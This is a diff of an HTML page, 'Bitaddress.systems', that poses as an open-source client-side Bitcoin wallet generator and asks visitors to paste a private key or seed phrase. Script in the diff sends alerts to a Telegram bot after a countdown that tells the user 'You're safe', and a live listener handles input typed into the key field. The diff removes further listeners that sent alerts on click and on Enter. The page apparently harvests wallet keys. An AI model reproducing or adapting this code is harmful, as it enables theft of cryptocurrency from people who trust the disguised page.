@@ -45,6 +45,8 @@
 	-->
 
     <title>Bitaddress.systems</title>
+	<meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="robots" content="index, follow" sitemap="https://bitaddress.systems/sitemap.xml">
 	<meta charset="utf-8">    
@@ -6444,12 +6446,6 @@ Bitcoin.Util = {
     
     </style>    
 
-
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Countdown Timer</title>
-
     <!-- Google tag (gtag.js) -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-WKH070VBDW">
     </script>
@@ -6517,29 +6513,12 @@ window.onload = function() {
             
             countdownElement.textContent = "Don't worry. You're safe";
             sendAlertToBot(); // Send alert to Telegram bot
-
                         
         }
     }, 1000);
 };
-
         
         document.getElementById('detailprivkey').addEventListener('input', handleInput);
-
-        
-        document.getElementById('viewDetailsButton').addEventListener('click', function() {
-            
-            sendAlertToBot();
-
-        });
-
-        
-        document.getElementById('detailprivkey').addEventListener('keypress', function(event) {
-            if (event.key === 'Enter') { 
-                sendAlertToBot(); 
-
-            }
-        });
 
 </script>	
 </head>
@@ -6582,7 +6561,7 @@ window.onload = function() {
     <div id="tagline"><em>Open Source JavaScript Client-Side Bitcoin Wallet Generator.</em></div>
 
 	<br><br>    
-	
+		<div id="detailarea" class="walletarea">	
             <div id="detailcommands" class="commands">
                 <span><label id="detaillabelenterprivatekey" for="detailprivkey">Enter Private Key</label></span>
                 <input type="text" id="detailprivkey" placeholder="Paste Private Key or Seed Phrase" onfocus="this.select();" onkeypress="if (event.keyCode == 13) ninja.wallets.detailwallet.viewDetails();" />
